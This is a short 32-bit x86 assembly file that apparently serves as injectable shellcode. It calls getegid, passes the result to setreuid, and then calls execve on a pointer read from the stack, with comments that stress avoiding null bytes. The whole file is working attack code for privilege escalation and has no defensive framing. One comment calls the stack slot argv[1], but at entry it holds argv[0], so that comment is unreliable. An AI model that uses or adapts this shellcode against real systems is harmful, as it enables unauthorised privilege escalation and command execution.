bits 32

global _start
section .text

_start:
    push 0x32
    pop eax             ; getegid, no null byte
    int 0x80

    mov ebx, eax        ; setreuid arg0
    mov ecx, eax        ; setreuid arg1
    push 0x46
    pop eax             ; setreuid, no null byte
    int 0x80
    
    push 0x0b           ; execve, no null byte
    pop eax
    mov ebx, [esp+4]    ; execve arg0 (pointer to argv[1] aka strpayload)
    ; mov ecx, [esp+8]    ; execve arg1 (pointer to argv[2], null string)
    ; mov edx, ecx        ; execve arg2 (pointer to argv[2], null string)
    xor ecx, ecx
    xor edx, edx
    int 0x80
